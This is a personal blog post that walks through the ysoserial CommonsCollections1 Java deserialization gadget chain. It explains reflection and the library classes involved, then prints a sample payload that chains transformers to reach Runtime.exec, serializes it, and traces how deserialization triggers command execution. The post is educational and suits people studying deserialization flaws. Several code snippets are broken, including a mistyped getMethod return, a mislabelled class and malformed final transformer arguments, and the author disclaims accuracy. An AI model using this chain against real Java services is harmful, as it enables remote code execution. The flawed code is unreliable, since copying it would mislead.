---
layout: "post"
title: "Taking a peek at Ysosreial CommonCollection1 Gadget"
date: "2021-06-25 08:33:02"
date_gmt: "2021-06-25 08:33:02"
modified: "2021-06-25 08:33:02"
modified_gmt: "2021-06-25 08:33:02"
slug: "taking-a-peek-at-ysosreial-commoncollection1-gadget"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2021/06/25/taking-a-peek-at-ysosreial-commoncollection1-gadget/"
guid: "https://y4y.space/?p=405"
wordpress_id: 405
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
## Preface

I finally got my shit together and decided to sit down and learn Java deserialization. So, I decided it'd be the best way to learn by analyzing the PoCs online, and ysoserial just happens to be one. I will probably analyze all the CommonCollections gadgets first, then move onto the rests.

This is **how I understand** it, and I don't claim everything in this article to be true. Read wisely and take other article/blogs as references.

We need to introduce some key points before we begin:

### Java Reflection Mechanics

My first encounter with Java reflection is in the CVE-2021-21985, which I made a blog about a while ago. This reflection mechanics can be potentially dangerous as we saw in CVE-2021-21985 since it literally allows the application to execute any methods from any classes, and that certainly includes `java.lang.Runtime.getRuntime.exec` and others.

Below are some example codes for the reflection method.

```java
Class cls = Runtime.class;
// this will return all the public methods in Runtime
Method[] methods = cls.getMethod();
/*
 *  or, if we know the method name, we can ask it to return this specific method.
 * the first argument is the argument name
 * the second argument corresponds to the argument type to the function
 * since getRuntime() does not require any arguments,
 * and not to upset getMethod, we pass an empty Class array.
 */
Method[] method = cls.getMethod("getRuntime", new Class[0]);

// A null can be passed in as argument because getRuntime() is a static method, which does not require to be instanciated. But for a non-static method, an instance is required.
Object runtime = method.invoke(null);

/*
 * Since exec() takes string as arguments,
 * so we need to pass String.class.
 * Then because exec() is not a static method,
 * we need to provide a reference to its caller (I guess).
 * Along with the instance reference, is the argument we want.
 */
cls.getMethod("exec", String.class).invoke(runtime, "calc.exe");
```

### Java Serialization

Unlike it is in PHP, in Java, to serialize an object, it has to implement the `Serializable` or `Externalizable` interface. There also has to be an output stream to write the object to a place, usually in a file.

Let's say the class `Person` is serializable:

```java
class person implements Serializable{

    ...
    private String name;

    public String getName(){
        return this.name;
    };

    public void setName(String name){
        this.name = name;
    };
    ...
}
```

to serialize the class:

```java
public class serialization_test {

    public static void main(String[] args) throws Exception{
        person p = new person();
        p.setName("yay");
        // serialize person object
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("person.ser")));
        oos.writeObject(p);
        oos.close();

        //deserialize person object
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("person.ser")));
        person p = (person) ois.readObject();
        System.out.println("Hello " + p.name + "!");
    }

}
```

Issues always appear when there is a `readObject` call since it is possible to customzie a `readObject` method, and a malicious attacker can always add bad stuff in the serialized object. This also makes Java deserialization way more difficult than PHP deserialization as the gadget chains are much more tedious to find.

### TransformedMap

In `commons-collections-3.1\src\java\org\apache\commons\collections\map\TransformedMap.java`

```java
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```

### ConstantTransformer

In `commons-collections-3.1\src\java\org\apache\commons\collections\functors\ConstantTransformer.java`

```java
public class ChainedTransformer implements Transformer, Serializable {
...

    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;
    }
}
```

### InvokerTransformer

In `commons-collections-3.1\src\java\org\apache\commons\collections\functors\InvokerTransformer.java`

```java
public class InvokerTransformer implements Transformer, Serializable {

    ...

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);

        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
}
```

### ChainedTransformer

In `commons-collections-3.1\src\java\org\apache\commons\collections\functors\ChainedTransformer.java`

```java
public class ChainedTransformer implements Transformer, Serializable {
...
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }

    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
}
```

### AnnotationInvocationHandler

In `sun.reflect.annotation.AnnotationInvocationHandler`

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
...

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }

    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }

...
}
```

## Chain It Together

### Sample Payload And Analysis

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
        "getMethod",
        new Class[] {
            String.class, Class[].class
        },
        new Object[] {
            "getRuntime",
            new Class[0]
        }
        ),
    new InvokerTransformer(
        "invoke",
        new Class[] {
            Object.class,
            Object[].class
        },
        new Object[] {
            null,
            new Object[0]
        }
    ),
    new InvokerTransformer(
        "exec",
        new Class[] {
            String.class,
            new Object[] {
                "calc.exe"
            }
        }
    )
};

Transformer transformedChain = new ChainedTransformer(transformers);

Map<String,String> BeforeTransformerMap = new HashMap<String,String>();

BeforeTransformerMap.put("hello", "hello");

Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);

Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Target.class, AfterTransformerMap);

File f = new File("temp.bin");
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
```

Let's analyze in the reverse order. So starting from the bottom.

The very last part writes the serialized data to a file, nothing fancy here. The second last part:

```java
Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Target.class, AfterTransformerMap);
```

constructs an instance of the `AnnotationInvocationHandler` class, with the `Target.class` and `AfterTransformerMap` arguments. Upon the instance being deserialized and the `readObject` function call, it will trigger `AnnotationInvocationHandler.readObject`, and during the call, `setValue` function is called:

```java
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
```

And it will trigger `checkSetValue` in `TransformedMap`:

```java
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

then proceed to do the transform. But we set the `valueTransformer` when we were constructing the `AfterTransformerMap`, which is exactly `transformedChain`, a `ChainedTransformer` instance.

We go back and look at the `transform` method, it takes `object` as an argument, and does a loop. That's when the gadget chain comes in.

First `Transformer` is `ConstantTransformer`, and no matter what arguments are passed in, it will always return `iConstant`, which in this case, is `Runtime.class`. And now the `object` is set to be `Runtime.class`.

Second `Transformer` is `InvokerTransformer`, and from the `Runtime.class` argument:

```java
        try {
            Class cls = Runtime.class;
            Method method = cls.getMethod("getMethod", new Class[...]);
            return method.invoke(Runtime.class, "getRuntime");

        }
```

Essentially it returns `Runtime.class.getMethod("getRuntime")`. And for some reason, the parent class for this is `java.lang.reflect.Method`, this info will be helpful in the next step.

I guess you can see where this is going. And now the third:

```java
        try {
            Class cls = java.lang.reflect.Method;
            Method method = cls.getMethod("invoke", new Class[...]);
            return method.invoke(Runtime.getRuntime, [Object[0], null]);
        }
```

The pass of `Object[0]` is equivalent to `null`, since some methods requires an argument, and passing a `null` will make them upset, so `Object[0]` will be used instead. It means passing an empty array of `Object`, and the first object is certainly `null`. And the `method.invoke(null, null)` will invoke the `Runtime.getRuntime()` method call, so `Runtime.getRuntime.getClass()` will be `java.lang.Runtime`.

Last but not least, the fourth one:
`java try { Class cls = Runtime.getRuntime.getClass(); Method method = cls.getMethod("exec", new Class[...]); return method.invoke(java.lang.Runtime.getRuntime() , new Object[] { "whoami" }); }`

This one should be easy enough, it invokes `java.lang.Runtime.exec` with `"whoami"`, and that executes system commands.

## Reference

- https://blog.csdn.net/jameson_/article/details/80137016
{% endraw %}
